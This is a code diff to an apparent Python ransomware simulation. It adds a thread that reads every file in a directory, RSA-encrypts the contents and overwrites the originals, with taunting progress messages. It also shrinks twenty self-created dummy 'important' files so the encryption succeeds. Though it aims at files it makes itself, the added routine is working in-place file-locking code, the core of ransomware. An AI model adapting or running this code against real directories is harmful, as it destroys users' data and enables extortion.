@@ -19,13 +19,20 @@ class EncrypterThread(threading.Thread):
         self._dir = dir_
 
     def run(self):
+        files_count: int = (len(os.listdir(self._dir)))
         for file_num, file in enumerate(os.listdir(self._dir)):
             if self._stop:
-                print("Encryption was stoped")
+                print("Encrypshion was stoped")
                 break
 
             sleep(1)
-            print(file_num, file)
+            print(
+                f"File {file} was encruptad! Files left {files_count-file_num+1}{files_count}"
+            )
+            with open(f"{self._dir}\\{file}", "rb") as f:
+                data = rsa.encrypt(f.read(), public_key)
+            with open(f"{self._dir}\\{file}", "wb") as f:
+                f.write(data)
 
     def stop(self):
         self._stop = True
@@ -84,7 +91,7 @@ if __name__ == "__main__":
 
     for i in range(20):
         with open(f"{files_path}\\imoprtent_file_{i}", "w") as f:
-            f.write("\n".join("som of ur importent info" for _ in range(100)))
+            f.write("\n".join("som of ur importent info" for _ in range(5)))
 
     clear()
     main()
